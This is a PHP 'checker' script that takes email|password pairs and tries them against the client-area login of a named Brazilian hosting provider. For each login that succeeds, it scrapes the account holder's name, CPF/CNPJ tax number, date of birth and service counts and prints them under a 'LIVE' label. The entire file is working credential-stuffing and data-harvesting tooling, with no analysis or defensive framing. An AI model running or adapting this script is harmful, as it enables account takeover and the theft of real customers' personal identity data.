
<?php
set_time_limit(0);
error_reporting(0);


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

/* switch ($ano) {
    case '2017':
        $ano = '17';
        break;
    case '2018':
        $ano = '18';
        break;
    
    case '2019':
        $ano = '19';
        break;
        case '2020':
        $ano = '20';
        break;
        case '2021':
        $ano = '21';
        break;
        case '2022':
        $ano = '22';
        break;
      
        case '2023':
        $ano = '23';
        break;
        case '2025':
        $ano = '25';
        break;
        case '2026':
        $ano = '26';
        break;
        
} */

$nc = new cURL();
$getoken = $nc->get('https://central.bhostbrasil.com.br/clientarea.php');
$token = getStr($getoken,'<input type="hidden" name="token" value="','" />');


$a = new cURL();
$b = $a->post('https://central.bhostbrasil.com.br/dologin.php', 'token='.$token.'&username='.$email.'&password='.$senha.'');
        
$bc = new cURL();
$infos = $bc->get('https://central.bhostbrasil.com.br/clientarea.php');

$bc2 = new cURL();
$infos2 = $bc2->get('https://central.bhostbrasil.com.br/clientarea.php?action=services');

$bc3 = new cURL();
$infos3 = $bc3->get('https://central.bhostbrasil.com.br/clientarea.php?action=details');



if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
               
        if (strpos($b, 'Perfil')) { 



$cpf = getStr($infos3, '<label class="control-label" for="customfield141">CPF/CNPJ</label>
                        <div class="control">
                            <input type="text" name="customfield[141]" id="customfield141" value="','" size="30" class="form-control" />');

$nasc = getStr($infos3, '<label class="control-label" for="customfield283">Data de Nascimento</label>
                        <div class="control">
                            <input type="text" name="customfield[283]" id="customfield283" value="','" size="30" class="form-control" />');



$nome = getStr($infos, ' <div class="panel-body">
                <strong>','</strong>');


$serv = getStr($infos2, '<span class="badge">','</span>                            <i class="fa fa-circle-o"></i>&nbsp;                            <span>Ativo</span>');



$cancel = getStr($infos2, '<a menuItemName="Terminated" href="/clientarea.php?action=services#" class="list-group-item" id="Primary_Sidebar-My_Services_Status_Filter-Terminated">
                            <span class="badge">','</span>                            <i class="fa fa-circle-o"></i>&nbsp;                            <span>Cancelado</span>
                        </a>
                                                                                <a menuItemName="Cancelled" href="/clientarea.php?action=services#" class="list-group-item" id="Primary_Sidebar-My_Services_Status_Filter-Cancelled">');



 echo "LIVE → $email|$senha | Nome: $nome | CPF: $cpf | Data de nascimento: $nasc | Serviços ativos: $serv | Serviços cancelados: $cancel #FlashReverso";
 
  

        }else{

        echo "DIE → $email|$senha";
   

}
 
    


?>
